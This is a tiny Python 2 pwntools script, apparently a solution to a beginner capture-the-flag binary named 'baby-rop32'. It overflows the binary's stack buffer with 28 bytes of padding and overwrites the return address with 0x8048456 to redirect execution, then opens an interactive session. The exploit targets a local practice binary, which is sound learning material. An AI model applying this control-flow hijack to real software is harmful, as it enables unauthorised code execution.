#!/usr/bin/env python2

from pwn import *
import sys

p = process('./baby-rop32')
p.write('a'*28 + p32(0x8048456))
p.interactive()
